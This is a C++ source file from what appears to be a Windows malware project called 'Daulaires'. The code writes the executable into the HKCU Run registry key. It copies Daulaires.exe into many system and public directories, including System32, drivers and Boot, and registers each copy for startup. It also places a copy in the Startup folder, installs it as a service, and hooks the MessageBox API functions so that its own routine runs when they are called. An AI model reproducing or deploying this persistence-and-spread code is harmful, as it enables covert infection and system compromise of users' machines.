#include "../Headers/Tools.h"

void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
    HKEY hKey = nullptr;

    // Open the registry key for current user startup programs
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Set the registry entry for your application
        if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), static_cast<DWORD>((appPath.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
            std::wcerr << L"Error setting registry entry." << std::endl;
        }

        // Close the registry key
        RegCloseKey(hKey);
    }
    else {
        std::wcerr << L"Error opening registry key." << std::endl;
    }


};

void write_file_to_dirs() {

    Memory Memory;
    map<string, string> paths;
    // app different paths to the map

    paths["path_1"] = "C:\\";
    paths["path_2"] = "C:\\Users\\Public\\";
    paths["path_3"] = "C:\\Windows\\";
    paths["path_4"] = "C:\\Users\\";
    paths["path_5"] = "C:\\Windows\\System32\\";
    paths["path_6"] = "C:\\Windows\\Boot\\";
    paths["path_7"] = "C:\\Users\\Public\\Documents\\";
    paths["path_8"] = "C:\\Users\\Public\\Downloads\\";
    paths["path_9"] = "C:\\Users\\Public\\Pictures\\";
    paths["path_10"] = "C:\\Users\\Public\\Videos\\";
    paths["path_11"] = "C:\\Windows\\System32\\drivers\\";
    paths["path_12"] = "C:\\Windows\\System32\\drivers\\etc\\";
    paths["path_13"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";

    // open up the paths in the map and check if there are anymore paths that can be added
    for (const auto& path : paths) {
        // check if the path exists
        if (std::filesystem::exists(path.second)) {
            // check if the path is a directory
            if (std::filesystem::is_directory(path.second)) {
                // loop through the directory and add the paths to the map
                for (const auto& entry : std::filesystem::directory_iterator(path.second)) {
                    // check if the path is a directory
                    if (std::filesystem::is_directory(entry.path())) {
                        // add the path to the map
                        paths[entry.path().string()] = entry.path().string() + "\\";
                    };
                };
            };
        };
    };

    // Set the app name
    std::wstring appName = L"Daulaires.exe";

    // Loop through all the paths and add Daulaires.exe to them
    for (const auto& path : paths) {
        // Convert the path to a string before adding the file name
        std::wstring pathString = std::wstring(path.second.begin(), path.second.end());
        std::wstring appPath = pathString + L"Daulaires.exe";

        // Add to startup
        addToStartup(appName + L" " + std::wstring(path.first.begin(), path.first.end()), appPath);
        // open the app data folder without wstring
        std::string appData = getenv("APPDATA");
        // convert the app data folder to a wstring
        std::wstring appDataW(appData.begin(), appData.end());
        // create the path to the startup folder
        std::wstring startupPath = appDataW + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
        // create the path to the app
        std::wstring appStartupPath = startupPath;
        // add the app name to the path
        appStartupPath += appName;
        // add the app to the startup folder
        CopyFileW(appPath.c_str(), appStartupPath.c_str(), FALSE);
        Memory.InstallService(L"Daulaires", L"Daulaires", appPath.c_str());

        // Delete the existing file (if it exists)
        DeleteFileW(appPath.c_str());

        // Copy the file to the path
        CopyFileW(appName.c_str(), appPath.c_str(), FALSE); // FALSE = overwrite
    }


};

// Hooked MessageBoxA function
int WINAPI messageBoxAHook::hookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
    // Function type for the original MessageBoxA
    typedef int (WINAPI* MessageBoxAType)(HWND, LPCSTR, LPCSTR, UINT);
    // Pointer to the original MessageBoxA function
    MessageBoxAType originalMessageBoxA = MessageBoxA;
    Main Main{};
    // cout << "Hooked to MessageBoxA" << endl;
    // write_file_to_dirs();
    Main.Windows();
    // Call the original MessageBoxA function
    return originalMessageBoxA(hWnd, lpText, lpCaption, uType);
};

// Hooked MessageBoxW function
int WINAPI messageBoxAHook::hookedMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {
    // Function type for the original MessageBoxW
    typedef int (WINAPI* MessageBoxWType)(HWND, LPCWSTR, LPCWSTR, UINT);

    // Pointer to the original MessageBoxW function
    MessageBoxWType originalMessageBoxW = MessageBoxW;
    Main Main{};

    // write_file_to_dirs();
    Main.Windows();
    // Call the original MessageBoxW function
    return originalMessageBoxW(hWnd, lpText, lpCaption, uType);
};

int messageBoxAHook::hookedMessageBoxExA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType, WORD wLanguageId)
{
    typedef int (WINAPI* MessageBoxExAType)(HWND, LPCSTR, LPCSTR, UINT, WORD);
    MessageBoxExAType originalMessageBoxExA = MessageBoxExA;

    Main Main{};
    // cout << "Hooked to MessageBoxExA" << endl;
    // write_file_to_dirs();
    Main.Windows();
    return originalMessageBoxExA(hWnd,lpText,lpCaption,uType,wLanguageId);
};